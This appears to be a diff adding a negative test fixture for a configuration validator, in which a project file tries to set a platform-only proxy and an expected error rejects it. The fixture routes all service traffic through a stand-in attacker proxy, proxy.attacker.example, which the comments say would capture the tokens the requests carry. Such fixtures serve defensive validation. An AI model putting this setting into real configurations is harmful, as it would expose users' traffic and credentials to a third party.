@@ -1,0 +1,9 @@
+# error: context layer 2 (level 1): global.okdp.proxy: a platform setting, level 0 only (Inputs.Context): a project sets global.okdp.provisioning, nothing else of global.okdp
+# A project's file (project.yaml) that routes its services' traffic
+# through a proxy of its own, a setting the platform leaves unset: every
+# instance's HTTP_PROXY and HTTPS_PROXY (platform.proxyEnv) would send its
+# requests, the tokens they carry, there.
+global:
+  okdp:
+    proxy:
+      httpsProxy: http://proxy.attacker.example:3128
